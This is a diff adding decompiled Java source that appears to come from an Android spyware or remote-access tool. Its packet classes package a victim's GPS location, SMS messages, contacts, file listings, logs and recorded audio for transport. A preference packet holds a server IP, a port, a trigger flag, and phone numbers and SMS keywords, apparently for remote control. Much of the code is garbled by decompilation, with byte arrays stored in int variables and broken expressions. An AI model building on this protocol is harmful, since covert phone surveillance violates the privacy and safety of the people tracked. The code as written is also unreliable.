+    byte[] data;
+    byte mf;
+    short numSeq;
+
+    public FilePacket()
+    {
+        return;
+    }
+
+    public FilePacket(short p1, byte p2, byte[] p3)
+    {
+        this.data = p3;
+        this.numSeq = p1;
+        this.mf = p2;
+        return;
+    }
+
+    public byte[] build()
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.allocate((this.data.length + 3));
+        v0.putShort(this.numSeq);
+        v0.put(this.mf);
+        v0.put(this.data);
+        return v0.array();
+    }
+
+    public byte[] getData()
+    {
+        return this.data;
+    }
+
+    public byte getMf()
+    {
+        return this.mf;
+    }
+
+    public short getNumSeq()
+    {
+        return this.numSeq;
+    }
+
+    public void parse(byte[] p5)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p5);
+        this.numSeq = v0.getShort();
+        this.mf = v0.get();
+        byte[] v1_0 = new byte[v0.remaining()];
+        this.data = v1_0;
+        v0.get(this.data, 0, v0.remaining());
+        return;
+    }
+}
+package Packet;
+public class FileTreePacket implements Packet.Packet {
+    private java.util.ArrayList list;
+
+    public FileTreePacket()
+    {
+        return;
+    }
+
+    public FileTreePacket(java.util.ArrayList p1)
+    {
+        this.list = p1;
+        return;
+    }
+
+    public byte[] build()
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(this.list);
+            int v3_1 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3_1 = 0;
+        }
+        return v3_1;
+    }
+
+    public java.util.ArrayList getList()
+    {
+        return this.list;
+    }
+
+    public void parse(byte[] p4)
+    {
+        try {
+            this.list = ((java.util.ArrayList) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p4)).readObject());
+        } catch (Exception v2) {
+        }
+        return;
+    }
+}
+package Packet;
+public class GPSPacket implements Packet.Packet {
+    private float accuracy;
+    private double altitude;
+    private double latitude;
+    private double longitude;
+    private float speed;
+
+    public GPSPacket()
+    {
+        return;
+    }
+
+    public GPSPacket(double p1, double p3, double p5, float p7, float p8)
+    {
+        this.latitude = p1;
+        this.longitude = p3;
+        this.altitude = p5;
+        this.speed = p7;
+        this.accuracy = p8;
+        return;
+    }
+
+    public byte[] build()
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.allocate(32);
+        System.out.println(new StringBuilder("Longitude : ").append(this.longitude).toString());
+        v0.putDouble(this.longitude);
+        v0.putDouble(this.latitude);
+        v0.putDouble(this.altitude);
+        v0.putFloat(this.speed);
+        v0.putFloat(this.accuracy);
+        return v0.array();
+    }
+
+    public float getAccuracy()
+    {
+        return this.accuracy;
+    }
+
+    public double getAltitude()
+    {
+        return this.altitude;
+    }
+
+    public double getLatitude()
+    {
+        return this.latitude;
+    }
+
+    public double getLongitude()
+    {
+        return this.longitude;
+    }
+
+    public float getSpeed()
+    {
+        return this.speed;
+    }
+
+    public void parse(byte[] p4)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p4);
+        this.longitude = v0.getDouble();
+        this.latitude = v0.getDouble();
+        this.altitude = v0.getDouble();
+        this.speed = v0.getFloat();
+        this.accuracy = v0.getFloat();
+        return;
+    }
+}
+package Packet;
+public class LogPacket implements Packet.Packet {
+    long date;
+    String message;
+    byte type;
+
+    public LogPacket()
+    {
+        return;
+    }
+
+    public LogPacket(long p1, byte p3, String p4)
+    {
+        this.date = p1;
+        this.type = p3;
+        this.message = p4;
+        return;
+    }
+
+    public byte[] build()
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.allocate((this.message.length() + 9));
+        v0.putLong(this.date);
+        v0.put(this.type);
+        v0.put(this.message.getBytes());
+        return v0.array();
+    }
+
+    public long getDate()
+    {
+        return this.date;
+    }
+
+    public String getMessage()
+    {
+        return this.message;
+    }
+
+    public byte getType()
+    {
+        return this.type;
+    }
+
+    public void parse(byte[] p5)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p5);
+        this.date = v0.getLong();
+        this.type = v0.get();
+        byte[] v1 = new byte[v0.remaining()];
+        v0.get(v1);
+        this.message = new String(v1);
+        return;
+    }
+}
+package Packet;
+public class PreferencePacket implements Packet.Packet, java.io.Serializable {
+    private static final long serialVersionUID = 4434667156231031;
+    String ip;
+    java.util.ArrayList keywordSMS;
+    java.util.ArrayList phoneNumberCall;
+    java.util.ArrayList phoneNumberSMS;
+    int port;
+    boolean waitTrigger;
+
+    public PreferencePacket()
+    {
+        return;
+    }
+
+    public PreferencePacket(String p1, int p2, boolean p3, java.util.ArrayList p4, java.util.ArrayList p5, java.util.ArrayList p6)
+    {
+        this.ip = p1;
+        this.port = p2;
+        this.waitTrigger = p3;
+        this.phoneNumberCall = p4;
+        this.phoneNumberSMS = p5;
+        this.keywordSMS = p6;
+        return;
+    }
+
+    public byte[] build()
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(this);
+            int v3 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3 = 0;
+        }
+        return v3;
+    }
+
+    public String getIp()
+    {
+        return this.ip;
+    }
+
+    public java.util.ArrayList getKeywordSMS()
+    {
+        return this.keywordSMS;
+    }
+
+    public java.util.ArrayList getPhoneNumberCall()
+    {
+        return this.phoneNumberCall;
+    }
+
+    public java.util.ArrayList getPhoneNumberSMS()
+    {
+        return this.phoneNumberSMS;
+    }
+
+    public int getPort()
+    {
+        return this.port;
+    }
+
+    public boolean isWaitTrigger()
+    {
+        return this.waitTrigger;
+    }
+
+    public void parse(byte[] p5)
+    {
+        try {
+            Packet.PreferencePacket v2_1 = ((Packet.PreferencePacket) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p5)).readObject());
+            this.setIp(v2_1.getIp());
+            this.setPort(v2_1.getPort());
+            this.setWaitTrigger(v2_1.isWaitTrigger());
+            this.setPhoneNumberCall(v2_1.getPhoneNumberCall());
+            this.setPhoneNumberSMS(v2_1.getPhoneNumberSMS());
+            this.setKeywordSMS(v2_1.getKeywordSMS());
+        } catch (Exception v3) {
+        }
+        return;
+    }
+
+    public void setIp(String p1)
+    {
+        this.ip = p1;
+        return;
+    }
+
+    public void setKeywordSMS(java.util.ArrayList p1)
+    {
+        this.keywordSMS = p1;
+        return;
+    }
+
+    public void setPhoneNumberCall(java.util.ArrayList p1)
+    {
+        this.phoneNumberCall = p1;
+        return;
+    }
+
+    public void setPhoneNumberSMS(java.util.ArrayList p1)
+    {
+        this.phoneNumberSMS = p1;
+        return;
+    }
+
+    public void setPort(int p1)
+    {
+        this.port = p1;
+        return;
+    }
+
+    public void setWaitTrigger(boolean p1)
+    {
+        this.waitTrigger = p1;
+        return;
+    }
+}
+package Packet;
+public class RawPacket implements Packet.Packet {
+    private byte[] data;
+
+    public RawPacket()
+    {
+        return;
+    }
+
+    public RawPacket(byte[] p1)
+    {
+        this.data = p1;
+        return;
+    }
+
+    public byte[] build()
+    {
+        return this.data;
+    }
+
+    public byte[] getData()
+    {
+        return this.data;
+    }
+
+    public void parse(byte[] p1)
+    {
+        this.data = p1;
+        return;
+    }
+}
+package Packet;
+public class ShortSMSPacket implements Packet.Packet {
+    private String address;
+    private int address_size;
+    private String body;
+    private int body_size;
+    private long date;
+
+    public ShortSMSPacket()
+    {
+        return;
+    }
+
+    public ShortSMSPacket(String p2, long p3, String p5)
+    {
+        this.address = p2;
+        this.address_size = p2.length();
+        this.date = p3;
+        this.body = p5;
+        this.body_size = this.body.length();
+        return;
+    }
+
+    public byte[] build()
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.allocate((((((((this.address.length() + 8) + 4) + 4) + 8) + 4) + this.body.length()) + 4));
+        v0.putInt(this.address_size);
+        v0.put(this.address.getBytes());
+        v0.putLong(this.date);
+        v0.putInt(this.body_size);
+        v0.put(this.body.getBytes());
+        return v0.array();
+    }
+
+    public String getAddress()
+    {
+        return this.address;
+    }
+
+    public String getBody()
+    {
+        return this.body;
+    }
+
+    public long getDate()
+    {
+        return this.date;
+    }
+
+    public void parse(byte[] p5)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p5);
+        this.address_size = v0.getInt();
+        byte[] v1_1 = new byte[this.address_size];
+        v0.get(v1_1);
+        this.address = new String(v1_1);
+        this.date = v0.getLong();
+        this.body_size = v0.getInt();
+        byte[] v1_0 = new byte[this.body_size];
+        v0.get(v1_0);
+        this.body = new String(v1_0);
+        return;
+    }
+}
+package Packet;
+public class SMSPacket implements Packet.Packet, java.io.Serializable {
+    private static final long serialVersionUID = 6169284240601506961;
+    private String address;
+    private String body;
+    private long date;
+    private int id;
+    private int person;
+    private int read;
+    private int thread_id;
+    private int type;
+
+    public SMSPacket()
+    {
+        return;
+    }
+
+    public SMSPacket(int p1, int p2, String p3, int p4, long p5, int p7, String p8, int p9)
+    {
+        this.id = p1;
+        this.thread_id = p2;
+        this.address = p3;
+        this.person = p4;
+        this.date = p5;
+        this.read = p7;
+        this.body = p8;
+        this.type = p9;
+        return;
+    }
+
+    public byte[] build()
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(this);
+            int v3 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3 = 0;
+        }
+        return v3;
+    }
+
+    public String getAddress()
+    {
+        return this.address;
+    }
+
+    public String getBody()
+    {
+        return this.body;
+    }
+
+    public long getDate()
+    {
+        return this.date;
+    }
+
+    public int getId()
+    {
+        return this.id;
+    }
+
+    public int getPerson()
+    {
+        return this.person;
+    }
+
+    public int getRead()
+    {
+        return this.read;
+    }
+
+    public int getThread_id()
+    {
+        return this.thread_id;
+    }
+
+    public int getType()
+    {
+        return this.type;
+    }
+
+    public void parse(byte[] p6)
+    {
+        try {
+            Packet.SMSPacket v2_1 = ((Packet.SMSPacket) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p6)).readObject());
+            this.id = v2_1.id;
+            this.thread_id = v2_1.thread_id;
+            this.address = v2_1.address;
+            this.body = v2_1.body;
+            this.date = v2_1.date;
+            this.person = v2_1.person;
+            this.read = v2_1.read;
+            this.type = v2_1.type;
+        } catch (Exception v3) {
+        }
+        return;
+    }
+
+    public void setType(int p1)
+    {
+        this.type = p1;
+        return;
+    }
+}
+package Packet;
+public class SMSTreePacket implements Packet.Packet {
+    java.util.ArrayList list;
+
+    public SMSTreePacket()
+    {
+        return;
+    }
+
+    public SMSTreePacket(java.util.ArrayList p1)
+    {
+        this.list = p1;
+        return;
+    }
+
+    public byte[] build()
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(this.list);
+            int v3_1 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3_1 = 0;
+        }
+        return v3_1;
+    }
+
+    public java.util.ArrayList getList()
+    {
+        return this.list;
+    }
+
+    public void parse(byte[] p4)
+    {
+        try {
+            this.list = ((java.util.ArrayList) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p4)).readObject());
+        } catch (Exception v2) {
+        }
+        return;
+    }
+}
+package Packet;
+public class TransportPacket implements Packet.Packet {
+    private short NumSeq;
+    private int awaitedLength;
+    private int channel;
+    private byte[] data;
+    private int fillingPosition;
+    private boolean last;
+    private int localLength;
+    private int totalLength;
+
+    public TransportPacket()
+    {
+        this.awaitedLength = 0;
+        this.fillingPosition = 0;
+        return;
+    }
+
+    public TransportPacket(int p1, int p2, int p3, boolean p4, short p5, byte[] p6)
+    {
+        this.totalLength = p1;
+        this.channel = p3;
+        this.last = p4;
+        this.data = p6;
+        this.localLength = p2;
+        this.NumSeq = p5;
+        return;
+    }
+
+    public byte[] build()
+    {
+        byte[] v0 = new byte[(this.data.length + 15)];
+        byte[] v1 = inout.Protocol.dataHeaderGenerator(this.totalLength, this.localLength, this.last, this.NumSeq, this.channel);
+        System.arraycopy(v1, 0, v0, 0, v1.length);
+        System.arraycopy(this.data, 0, v0, v1.length, this.data.length);
+        return v0;
+    }
+
+    public void dataFilling(java.nio.ByteBuffer p3, int p4)
+    {
+        if (this.data == null) {
+            int v0_4 = new byte[this.localLength];
+            this.data = v0_4;
+        }
+        p3.get(this.data, this.fillingPosition, p4);
+        this.fillingPosition = (this.fillingPosition + p4);
+        this.awaitedLength = (this.localLength - this.fillingPosition);
+        return;
+    }
+
+    public int getChannel()
+    {
+        return this.channel;
+    }
+
+    public byte[] getData()
+    {
+        return this.data;
+    }
+
+    public int getLocalLength()
+    {
+        return this.localLength;
+    }
+
+    public short getNumSeq()
+    {
+        return this.NumSeq;
+    }
+
+    public int getTotalLength()
+    {
+        return this.totalLength;
+    }
+
+    public boolean isLast()
+    {
+        return this.last;
+    }
+
+    public void parse(byte[] p6)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.wrap(p6);
+        this.totalLength = v0.getInt();
+        this.localLength = v0.getInt();
+        if (v0.get() != 1) {
+            this.last = 0;
+        } else {
+            this.last = 1;
+        }
+        this.NumSeq = v0.getShort();
+        this.channel = v0.getInt();
+        byte[] v2_3 = new byte[v0.remaining()];
+        this.data = v2_3;
+        v0.get(this.data, 0, v0.remaining());
+        return;
+    }
+
+    public boolean parse(java.nio.ByteBuffer p6)
+    {
+        int v1_0 = 1;
+        this.totalLength = p6.getInt();
+        this.localLength = p6.getInt();
+        if (p6.get() != 1) {
+            this.last = 0;
+        } else {
+            this.last = 1;
+        }
+        this.NumSeq = p6.getShort();
+        this.channel = p6.getInt();
+        if ((p6.limit() - p6.position()) >= this.localLength) {
+            int v1_2 = new byte[this.localLength];
+            this.data = v1_2;
+            p6.get(this.data, 0, this.data.length);
+            v1_0 = 0;
+        } else {
+            this.dataFilling(p6, (p6.limit() - p6.position()));
+        }
+        return v1_0;
+    }
+
+    public boolean parseCompleter(java.nio.ByteBuffer p3)
+    {
+        int v0_3;
+        if ((p3.limit() - p3.position()) >= this.awaitedLength) {
+            this.dataFilling(p3, this.awaitedLength);
+            v0_3 = 0;
+        } else {
+            this.dataFilling(p3, (p3.limit() - p3.position()));
+            v0_3 = 1;
+        }
+        return v0_3;
+    }
+}
+package utils;
+public class Contact implements java.io.Serializable {
+    private static final long serialVersionUID = 17702672459763618352;
+    String OrganisationName;
+    String OrganisationStatus;
+    String city;
+    String country;
+    String display_name;
+    java.util.ArrayList emails;
+    long id;
+    long last_time_contacted;
+    java.util.ArrayList messaging;
+    java.util.ArrayList notes;
+    java.util.ArrayList phones;
+    byte[] photo;
+    String postalcode;
+    String region;
+    int starred;
+    String street;
+    int times_contacted;
+    int type_addr;
+
+    public Contact()
+    {
+        return;
+    }
+
+    public String getCity()
+    {
+        return this.city;
+    }
+
+    public String getCountry()
+    {
+        return this.country;
+    }
+
+    public String getDisplay_name()
+    {
+        return this.display_name;
+    }
+
+    public java.util.ArrayList getEmails()
+    {
+        return this.emails;
+    }
+
+    public long getId()
+    {
+        return this.id;
+    }
+
+    public long getLast_time_contacted()
+    {
+        return this.last_time_contacted;
+    }
+
+    public java.util.ArrayList getMessaging()
+    {
+        return this.messaging;
+    }
+
+    public java.util.ArrayList getNotes()
+    {
+        return this.notes;
+    }
+
+    public String getOrganisationName()
+    {
+        return this.OrganisationName;
+    }
+
+    public String getOrganisationStatus()
+    {
+        return this.OrganisationStatus;
+    }
+
+    public java.util.ArrayList getPhones()
+    {
+        return this.phones;
+    }
+
+    public byte[] getPhoto()
+    {
+        return this.photo;
+    }
+
+    public String getPostalcode()
+    {
+        return this.postalcode;
+    }
+
+    public String getRegion()
+    {
+        return this.region;
+    }
+
+    public int getStarred()
+    {
+        return this.starred;
+    }
+
+    public String getStreet()
+    {
+        return this.street;
+    }
+
+    public int getTimes_contacted()
+    {
+        return this.times_contacted;
+    }
+
+    public int getType_addr()
+    {
+        return this.type_addr;
+    }
+
+    public void setCity(String p1)
+    {
+        this.city = p1;
+        return;
+    }
+
+    public void setCountry(String p1)
+    {
+        this.country = p1;
+        return;
+    }
+
+    public void setDisplay_name(String p1)
+    {
+        this.display_name = p1;
+        return;
+    }
+
+    public void setEmails(java.util.ArrayList p1)
+    {
+        this.emails = p1;
+        return;
+    }
+
+    public void setId(long p1)
+    {
+        this.id = p1;
+        return;
+    }
+
+    public void setLast_time_contacted(long p1)
+    {
+        this.last_time_contacted = p1;
+        return;
+    }
+
+    public void setMessaging(java.util.ArrayList p1)
+    {
+        this.messaging = p1;
+        return;
+    }
+
+    public void setNotes(java.util.ArrayList p1)
+    {
+        this.notes = p1;
+        return;
+    }
+
+    public void setOrganisationName(String p1)
+    {
+        this.OrganisationName = p1;
+        return;
+    }
+
+    public void setOrganisationStatus(String p1)
+    {
+        this.OrganisationStatus = p1;
+        return;
+    }
+
+    public void setPhones(java.util.ArrayList p1)
+    {
+        this.phones = p1;
+        return;
+    }
+
+    public void setPhoto(byte[] p1)
+    {
+        this.photo = p1;
+        return;
+    }
+
+    public void setPostalcode(String p1)
+    {
+        this.postalcode = p1;
+        return;
+    }
+
+    public void setRegion(String p1)
+    {
+        this.region = p1;
+        return;
+    }
+
+    public void setStarred(int p1)
+    {
+        this.starred = p1;
+        return;
+    }
+
+    public void setStreet(String p1)
+    {
+        this.street = p1;
+        return;
+    }
+
+    public void setTimes_contacted(int p1)
+    {
+        this.times_contacted = p1;
+        return;
+    }
+
+    public void setType_addr(int p1)
+    {
+        this.type_addr = p1;
+        return;
+    }
+}
+package utils;
+public class EncoderHelper {
+
+    public EncoderHelper()
+    {
+        return;
+    }
+
+    public static java.util.ArrayList decodeArrayList(byte[] p4)
+    {
+        try {
+            int v3_1 = ((java.util.ArrayList) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p4)).readObject());
+        } catch (Exception v1) {
+            v3_1 = 0;
+        }
+        return v3_1;
+    }
+
+    public static java.util.HashMap decodeHashMap(byte[] p4)
+    {
+        try {
+            int v3_1 = ((java.util.HashMap) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p4)).readObject());
+        } catch (Exception v1) {
+            v3_1 = 0;
+        }
+        return v3_1;
+    }
+
+    public static java.util.HashSet decodeHashSet(byte[] p4)
+    {
+        try {
+            int v3_1 = ((java.util.HashSet) new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(p4)).readObject());
+        } catch (Exception v1) {
+            v3_1 = 0;
+        }
+        return v3_1;
+    }
+
+    public static byte[] encodeArrayList(java.util.ArrayList p4)
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(p4);
+            int v3 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3 = 0;
+        }
+        return v3;
+    }
+
+    public static byte[] encodeHashMap(java.util.HashMap p4)
+    {
+        try {
+            java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+            new java.io.ObjectOutputStream(v0_1).writeObject(p4);
+            int v3 = v0_1.toByteArray();
+        } catch (java.io.IOException v1) {
+            v3 = 0;
+        }
+        return v3;
+    }
+
+    public static byte[] encodeHashSet(java.util.HashSet p4)
+    {
+        byte[] v3 = 0;
+        if (p4 != null) {
+            try {
+                java.io.ByteArrayOutputStream v0_1 = new java.io.ByteArrayOutputStream();
+                new java.io.ObjectOutputStream(v0_1).writeObject(p4);
+                v3 = v0_1.toByteArray();
+            } catch (java.io.IOException v1) {
+            }
+        }
+        return v3;
+    }
+
+    public static byte[] encodeLong(long p2)
+    {
+        java.nio.ByteBuffer v0 = java.nio.ByteBuffer.allocate(8);
+        v0.putLong(p2);
+        return v0.array();
+    }
+}
+package utils;
+public class MyFile implements java.io.Serializable {
+    private static final long serialVersionUID = 10370417480181610451;
+    public boolean hidden;
+    public boolean isDir;
+    public boolean isFile;
+    public long lastModif;
+    public long length;
+    public java.util.ArrayList list;
+    public String name;
+    public String path;
+    public boolean r;
+    public boolean w;
+
+    public MyFile(java.io.File p4)
+    {
+        this.isFile = 0;
+        this.isDir = 1;
+        this.lastModif = 0;
+        this.length = 0;
+        this.name = p4.getName();
+        this.length = p4.length();
+        this.lastModif = p4.lastModified();
+        this.isFile = p4.isFile();
+        this.isDir = p4.isDirectory();
+        this.r = p4.canRead();
+        this.w = p4.canWrite();
+        this.hidden = p4.isHidden();
+        this.path = p4.getPath();
+        this.list = new java.util.ArrayList();
+        return;
+    }
+
+    public void addChild(utils.MyFile p2)
+    {
+        this.list.add(p2);
+        return;
+    }
+
+    public byte[] build()
+    {
+        return 0;
+    }
+
+    public long getLastModif()
+    {
+        return this.lastModif;
+    }
+
+    public long getLength()
+    {
+        return this.length;
+    }
+
+    public java.util.ArrayList getList()
+    {
+        return this.list;
+    }
+
+    public String getName()
+    {
+        return this.name;
+    }
+
+    public String getPath()
+    {
+        return this.path;
+    }
+
+    public boolean isDir()
+    {
+        return this.isDir;
+    }
+
+    public boolean isFile()
+    {
+        return this.isFile;
+    }
+
+    public boolean isHidden()
+    {
+        return this.hidden;
+    }
+
+    public boolean isR()
+    {
+        return this.r;
+    }
+
+    public boolean isW()
+    {
+        return this.w;
+    }
+
+    public void parse(byte[] p1)
+    {
+        return;
+    }
+
+    public void setDir(boolean p1)
+    {
+        this.isDir = p1;
+        return;
+    }
+
+    public void setFile(boolean p1)
+    {
+        this.isFile = p1;
+        return;
+    }
+
+    public void setHidden(boolean p1)
+    {
+        this.hidden = p1;
+        return;
+    }
+
+    public void setLastModif(long p1)
+    {
+        this.lastModif = p1;
+        return;
+    }
+
+    public void setLength(long p1)
+    {
+        this.length = p1;
+        return;
+    }
+
+    public void setName(String p1)
+    {
+        this.name = p1;
+        return;
+    }
+
+    public void setPath(String p1)
+    {
+        this.path = p1;
+        return;
+    }
+
+    public void setR(boolean p1)
+    {
+        this.r = p1;
+        return;
+    }
+
+    public void setW(boolean p1)
+    {
+        this.w = p1;
+        return;
+    }
+}
+package utils;
+public class wavIO {
+    private int myBitsPerSample;
+    private int myBlockAlign;
+    private long myByteRate;
+    private long myChannels;
+    private long myChunkSize;
+    public byte[] myData;
+    private long myDataSize;
+    private int myFormat;
+    private String myPath;
+    private long mySampleRate;
+    private long mySubChunk1Size;
+
+    public wavIO()
+    {
+        this.myPath = "";
+        return;
+    }
+
+    public wavIO(String p1)
+    {
+        this.myPath = p1;
+        return;
+    }
+
+    public static int byteArrayToInt(byte[] p4)
+    {
+        return (((p4[1] & 255) << 8) | (p4[0] & 255));
+    }
+
+    public static long byteArrayToLong(byte[] p10)
+    {
+        int v2 = 0;
+        byte[] v7 = new byte[4];
+        int v3_0 = 0;
+        while (v3_0 < 4) {
+            v7[v2] = p10[v3_0];
+            v2++;
+            v3_0++;
+        }
+        long v0 = 0;
+        int v3_1 = 0;
+        int v5 = 0;
+        while (v5 < 32) {
+            v0 |= (((long) (v7[v3_1] & 255)) << v5);
+            v3_1++;
+            v5 += 8;
+        }
+        return v0;
+    }
+
+    private static byte[] intToByteArray(int p3)
+    {
+        byte[] v0 = new byte[4];
+        v0[0] = ((byte) (p3 & 255));
+        v0[1] = ((byte) ((p3 >> 8) & 255));
+        v0[2] = ((byte) ((p3 >> 16) & 255));
+        v0[3] = ((byte) ((p3 >> 24) & 255));
+        return v0;
+    }
+
+    public static byte[] shortToByteArray(short p3)
+    {
+        byte[] v0_1 = new byte[2];
+        v0_1[0] = ((byte) (p3 & 255));
+        v0_1[1] = ((byte) ((p3 >> 8) & 255));
+        return v0_1;
+    }
+
+    public String getPath()
+    {
+        return this.myPath;
+    }
+
+    public String getSummary()
+    {
+        return new StringBuilder("<html>Format: ").append(this.myFormat).append("<br>").append("Channels: ").append(this.myChannels).append("<br>").append("SampleRate: ").append(this.mySampleRate).append("<br>").append("ByteRate: ").append(this.myByteRate).append(String v0).append("BlockAlign: ").append(this.myBlockAlign).append("<br>").append("BitsPerSample: ").append(this.myBitsPerSample).append("<br>").append("DataSize: ").append(this.myDataSize).append("</html>").toString();
+    }
+
+    public boolean read()
+    {
+        this.myData = 0;
+        byte[] v8 = new byte[4];
+        byte[] v7 = new byte[2];
+        try {
+            java.io.DataInputStream v5_0 = new java.io.DataInputStream(new java.io.FileInputStream(this.myPath));
+            try {
+                new StringBuilder().append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).toString();
+                int vtmp10 = v5_0.read(v8);
+                this.myChunkSize = utils.wavIO.byteArrayToLong(v8);
+                new StringBuilder().append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).toString();
+                new StringBuilder().append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).toString();
+                int vtmp30 = v5_0.read(v8);
+                this.mySubChunk1Size = utils.wavIO.byteArrayToLong(v8);
+                v5_0.read(v7);
+                this.myFormat = utils.wavIO.byteArrayToInt(v7);
+                v5_0.read(v7);
+                this.myChannels = ((long) utils.wavIO.byteArrayToInt(v7));
+                v5_0.read(v8);
+                this.mySampleRate = utils.wavIO.byteArrayToLong(v8);
+                v5_0.read(v8);
+                this.myByteRate = utils.wavIO.byteArrayToLong(v8);
+                v5_0.read(v7);
+                this.myBlockAlign = utils.wavIO.byteArrayToInt(v7);
+                v5_0.read(v7);
+                this.myBitsPerSample = utils.wavIO.byteArrayToInt(v7);
+                new StringBuilder().append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).append(((char) v5_0.readByte())).toString();
+                int vtmp53 = v5_0.read(v8);
+                this.myDataSize = utils.wavIO.byteArrayToLong(v8);
+                int v9_18 = new byte[((int) this.myDataSize)];
+                this.myData = v9_18;
+                v5_0.read(this.myData);
+                v5_0.close();
+                int v9_20 = 1;
+            } catch (Exception v2) {
+                v9_20 = 0;
+            }
+            return v9_20;
+        } catch (Exception v2) {
+        }
+    }
+
+    public void readRaw()
+    {
+        try {
+            java.io.File v0_1 = new java.io.File(this.myPath);
+            java.io.DataInputStream v1_1 = new java.io.DataInputStream(new java.io.FileInputStream(v0_1));
+            this.myDataSize = ((long) ((int) v0_1.length()));
+            Exception v2_4 = new byte[((int) this.myDataSize)];
+            this.myData = v2_4;
+            v1_1.read(this.myData);
+            v1_1.close();
+        } catch (Exception v2) {
+        }
+        return;
+    }
+
+    public boolean save()
+    {
+        try {
+            java.io.DataOutputStream v1_1 = new java.io.DataOutputStream(new java.io.FileOutputStream(this.myPath));
+            v1_1.writeBytes("RIFF");
+            v1_1.write(utils.wavIO.intToByteArray(((int) this.myChunkSize)), 0, 4);
+            v1_1.writeBytes("WAVE");
+            v1_1.writeBytes("fmt ");
+            v1_1.write(utils.wavIO.intToByteArray(((int) this.mySubChunk1Size)), 0, 4);
+            v1_1.write(utils.wavIO.shortToByteArray(((short) this.myFormat)), 0, 2);
+            v1_1.write(utils.wavIO.shortToByteArray(((short) ((int) this.myChannels))), 0, 2);
+            v1_1.write(utils.wavIO.intToByteArray(((int) this.mySampleRate)), 0, 4);
+            v1_1.write(utils.wavIO.intToByteArray(((int) this.myByteRate)), 0, 4);
+            v1_1.write(utils.wavIO.shortToByteArray(((short) this.myBlockAlign)), 0, 2);
+            v1_1.write(utils.wavIO.shortToByteArray(((short) this.myBitsPerSample)), 0, 2);
+            v1_1.writeBytes("data");
+            v1_1.write(utils.wavIO.intToByteArray(((int) this.myDataSize)), 0, 4);
+            v1_1.write(this.myData);
+        } catch (Exception v0) {
+            System.out.println(v0.getMessage());
+        }
+        return 1;
+    }
+
+    public boolean save2()
+    {
+        try {
+            java.io.DataOutputStream v1_1 = new java.io.DataOutputStream(new java.io.FileOutputStream(this.myPath));
+            v1_1.writeBytes("RIFF");
+            v1_1.writeInt(Integer.reverseBytes(((int) this.myChunkSize)));
+            v1_1.writeBytes("WAVE");
+            v1_1.writeBytes("fmt ");
+            v1_1.writeInt(Integer.reverseBytes(((int) this.mySubChunk1Size)));
+            v1_1.writeShort(Short.reverseBytes(((short) this.myFormat)));
+            v1_1.writeShort(Short.reverseBytes(((short) ((int) this.myChannels))));
+            v1_1.writeInt(Integer.reverseBytes(((int) this.mySampleRate)));
+            v1_1.writeInt(Integer.reverseBytes(((int) this.myByteRate)));
+            v1_1.writeShort(Short.reverseBytes(((short) this.myBlockAlign)));
+            v1_1.writeShort(Short.reverseBytes(((short) this.myBitsPerSample)));
+            v1_1.writeBytes("data");
+            v1_1.writeInt(Integer.reverseBytes(((int) this.myDataSize)));
+            v1_1.write(this.myData);
+            int v2_33 = 1;
+        } catch (Exception v0) {
+            System.out.println(v0.getMessage());
+            v2_33 = 0;
+        }
+        return v2_33;
+    }
+
+    public void setHeaders()
+    {
+        this.myChunkSize = (this.myDataSize + 36);
+        this.mySubChunk1Size = 16;
+        this.myFormat = 1;
+        this.myChannels = 1;
+        this.mySampleRate = 11025;
+        this.myByteRate = 20050;
+        this.myBlockAlign = 2;
+        this.myBitsPerSample = 16;
+        return;
+    }
+
+    public void setPath(String p1)
+    {
+        this.myPath = p1;
+        return;
+    }
+}
